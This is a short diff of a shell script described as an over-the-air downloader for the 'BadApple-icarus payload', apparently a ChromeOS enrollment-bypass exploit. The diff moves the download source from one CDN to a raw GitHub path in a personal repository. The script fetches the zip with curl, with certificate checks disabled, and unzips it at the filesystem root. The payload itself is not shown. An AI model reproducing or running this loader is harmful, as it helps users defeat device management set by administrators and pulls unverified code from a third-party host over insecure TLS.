@@ -3,7 +3,7 @@
 # written by appleflyer
 # ota stands for over-the-air, because this payload is intended only to be used over the air, so the user does not need to take the trouble to manually download the zip file and unzip it and stuff
 
-CDN_DOMAIN="cdn.fanqyxl.net"
+CDN_DOMAIN="github.com"
 
 mexit(){
 	printf "$1\n"
@@ -16,7 +16,7 @@ main(){
 	echo "starting the BadApple-icarus payload downloader..."
 	cd /
 	echo "downloading the icarus payload..."
-	curl -SLk -o icarus_ba.zip "${CDN_DOMAIN}/icarus_ba.zip" || mexit "error occured whilst downloading icarus payload. is your wifi working / did you connect to wifi?"
+	curl -SLk -o icarus_ba.zip "${CDN_DOMAIN}/naiythen/myicarus/raw/refs/heads/main/icarus_ba.zip" || mexit "error occured whilst downloading icarus payload. is your wifi working / did you connect to wifi?"
 	echo "payload successfully downloaded."
 	unzip icarus_ba.zip || mexit "error unzipping the payload."
 	echo "payload unzipped."
